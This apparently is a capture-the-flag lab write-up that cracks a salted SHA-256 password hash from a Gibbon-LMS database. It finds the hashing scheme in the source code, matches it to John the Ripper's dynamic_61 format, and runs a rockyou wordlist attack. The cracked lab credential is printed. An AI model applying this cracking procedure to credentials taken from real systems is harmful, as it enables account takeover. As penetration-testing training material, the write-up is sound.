
If you found credentials in a database which are encoded and got the salt, you need to find out the hash algorithm. 

Username

```
f.frizzle
```

Hash Encoded Password

```
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
```

Salt

```
/aACFhikmNopqrRTVz2489
```

Search for Files (in the CMS Directory) and search for "passwordStrong" in the Source Code. It will reveal the hashing algorithm and the format.

For Example the "preferencesPasswordProcess.php" in C:\xampp\htdocs\Gibbon-LMS reveals the hash algorithm SHA-256.

```
$passwordStrong = hash('sha-256', $salt.$passwordNew);
```

After check out John The Ripper to see which format is being used:

```
john --list=format-details --format=all | cut -f 1,7 | grep -i sha256
```

Inspecting all hash formats of sha256, we can see that "dynamic_61" matches the procedure which Gibbon-LMS also uses with the salt being in front and the encoded password string right after!

```
dynamic_61      sha256($s.$p) 256/256 AVX2 8x
```

Target hash, fields are separated by $, fields are dynamic_61:hash:salt

I stored it inside an f.frizz file on my local machine:

```
$dynamic_61$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489

```

Successfully bruteforced an password.

```
john f.frizz --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "hMailServer", but the string is also recognized as "dynamic_61"
Use the "--format=dynamic_61" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (hMailServer [sha256($s.$p) 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Jenni_Luvs_Magic23 (?)     
1g 0:00:00:01 DONE (2026-07-22 12:22) 0.6024g/s 6639Kp/s 6639Kc/s 6639KC/s Jesus14jrj..Jeepers93
Use the "--show --format=hMailServer" options to display all of the cracked passwords reliably
Session completed.
```

```
f.frizzle:Jenni_Luvs_Magic23
```